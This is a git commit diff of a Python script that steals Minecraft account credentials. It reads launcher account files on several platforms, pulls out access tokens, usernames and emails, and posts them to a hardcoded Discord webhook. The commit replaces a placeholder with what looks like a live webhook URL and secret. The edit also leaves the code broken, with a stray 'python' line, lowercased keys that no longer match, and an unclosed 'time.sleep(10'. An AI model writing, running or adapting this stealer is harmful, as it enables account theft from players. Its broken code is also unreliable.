0a3ef5ca9ad3611724003d32b8b5cccb9735095f
Lunor1s <163518905+Lunor1s@users.noreply.github.com>
2024-03-15 17:01:15 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,69 +1,73 @@
+python
 import json, os, requests
+import time
 
-webhook = 'Your webhook drrr'
+webhook = 'https://discord.com/api/webhooks/1218191862620225536/cfqpLpWkCbkksjrstXTVeclTpirSY3SE84iN_2Zb5IpE3C57foL1PL26Sz6Whepkl30g'
 
 accounts = []
 
-def getUser():
+def getuser():
     return os.path.split(os.path.expanduser('~'))[-1]
 
-def sendWebhook():
+def sendwebhook():
     embeds = []
     count = 0
 
     for account in accounts:
         if '@' in account[2]:
-            name = 'Email Address'
+            name = 'email address'
         else:
-            name = 'Xbox Username'
+            name = 'xbox username'
 
         embed = [{
             'fields': [
                 {'name': name, 'value': account[2], 'inline': False},
-                {'name': 'Username', 'value': account[0], 'inline': False},
-                {'name': 'Session Type', 'value': account[1], 'inline': False},
-                {'name': 'Session Authorization', 'value': account[3], 'inline': False}
+                {'name': 'username', 'value': account[0], 'inline': False},
+                {'name': 'session type', 'value': account[1], 'inline': False},
+                {'name': 'session authorization', 'value': account[3], 'inline': False}
             ]
         }]
 
         headers = {
-            'Content-Type': 'application/json',
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+            'content-type': 'application/json',
+            'user-agent': 'mozilla/5.0 (x11; linux x86_64) applewebkit/537.11 (khtml, like gecko) chrome/23.0.1271.64 safari/537.11'
         }
 
         payload = json.dumps({'embeds': embed})
         req = requests.post(url=webhook, data=payload, headers=headers).text
 
-def getLocations():
+def getlocations():
     if os.name == 'nt':
         locations = [
-            f'{os.getenv("APPDATA")}\\.minecraft\\launcher_accounts.json',
-            f'{os.getenv("APPDATA")}\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
+            f'{os.getenv("appdata")}\\\\.minecraft\\\\launcher_accounts.json',
+            f'{os.getenv("appdata")}\\\\local\\packages\\\\microsoft.minecraftuwp_8wekyb3d8bbwe\\\\localstate\\\\games\\\\com.mojang\\\\'
         ]
         return locations
     else:
         locations = [
-            f'\\home\\{getUser()}\\.minecraft\\launcher_accounts.json',
-            f'\\sdcard\\games\\com.mojang\\',
-            f'\\~\\Library\\Application Support\\minecraft'
-            f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
+            f'\\\\home\\\\{getuser()}\\\\.minecraft\\\\launcher_accounts.json',
+            f'\\\\sdcard\\\\games\\\\com.mojang\\\\',
+            f'\\\\~\\\\library\\\\application support\\\\minecraft'
+            f'apps\\\\com.mojang.minecraftpe\\\\documents\\\\games\\\\com.mojang\\\\'
         ]
         return locations
 
 def main():
-    for location in getLocations():
+    for location in getlocations():
         if os.path.exists(location):
             auth_db = json.loads(open(location).read())['accounts']
 
             for d in auth_db:
-                sessionKey = auth_db[d].get('accessToken')
-                username = auth_db[d].get('minecraftProfile')['name']
-                sessionType = auth_db[d].get('type')
+                sessionkey = auth_db[d].get('accesstoken')
+                username = auth_db[d].get('minecraftprofile')['name']
+                sessiontype = auth_db[d].get('type')
                 email = auth_db[d].get('username')
-                if sessionKey != None or '':
-                    accounts.append([username, sessionType, email, sessionKey])
+                if sessionkey != None and sessionkey != '':
+                    accounts.append([username, sessiontype, email, sessionkey])
 
-    sendWebhook()
+    sendwebhook()
 
 if __name__ == '__main__':
     main()
+    
+time.sleep(10
